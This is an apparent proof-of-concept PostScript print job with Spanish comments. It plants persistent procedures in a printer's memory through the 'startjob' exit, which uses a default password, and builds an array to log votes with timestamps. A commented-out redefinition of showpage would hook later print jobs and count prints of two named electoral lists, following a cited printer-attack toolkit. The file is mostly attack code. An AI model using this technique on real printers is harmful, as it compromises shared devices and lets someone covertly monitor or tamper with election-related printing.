%!PS-Adobe-3.0
%%Creator: Ignacio E. Losiggio
%%CreationDate: Wed Sep 20 15:29:00 2017
%%Pages: 1
%%DocumentData: Clean7Bit
%%LanguageLevel: 2
%%DocumentMedia: A4 595 842 0 () ()
%%BoundingBox: 31 24 86 274
%%EndComments

% El trucazo para poder definir cosas en userdict y que queden entre impresiones
true 0 startjob pop

% Sacar la fecha actual
/ahoramesmo {
  (%Calendar%) /IODevice resourcestatus
  3 1 roll pop pop
  { (%Calendar%) currentdevparams /DateTime get }
  { (Not available) } ifelse
} def

/cantvotos 300 def
/currvoto 0 def % Las mesas no tienen mas de 400 votantes en general
/votos cantvotos array def

/pushvoto {
  votos currvoto 3 -1 roll % acomodo el stack
  put % sumo el voto
  /currvoto currvoto 1 add cantvotos mod def % incremento el voto actual
} def

/sumarvoto {
  % Tiene que tomar la fecha y hora, la lista y agregarla al array de votos
  dup [ exch ahoramesmo ] % creo el voto
  pushvoto % lo agrego a la lista
} def

% Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
%/lista1 (PABLO LESCANO) def
%/lista2 (MALAFAMA) def
% Podría agregarse algo así a showpage
% se tiene que construir un ataque similar al de https://github.com/RUB-NDS/PRET
% los cambios no son duraderos dentro del job, así que tendría que imprimir y LUEGO
% ejecutar el código de voto
%/showpage {
%  count 0 gt { % Si hay algo en el stack
%    dup        % Lo duplico por las dudas
%    lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
%    dup
%    lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
%  } if
%  systemdict /showpage get exec
%} def

% Imprimo algo
false 0 startjob pop

/ypos 800 def
/newline {
  100 ypos moveto
  /ypos ypos 14 sub def
} def

/Courier findfont 12 scalefont setfont
newline (Impresora kakeada) show
newline (Creados:) show
newline (    - /votos      (array))         show
newline (    - /currvoto   (variable))      show
newline (    - /cantvotos  (constante))     show
newline (    - /sumarvoto  (procedimiento)) show
newline (    - /pushvoto   (procedimiento)) show
newline (    - /ahoramesmo (procedimiento)) show
showpage
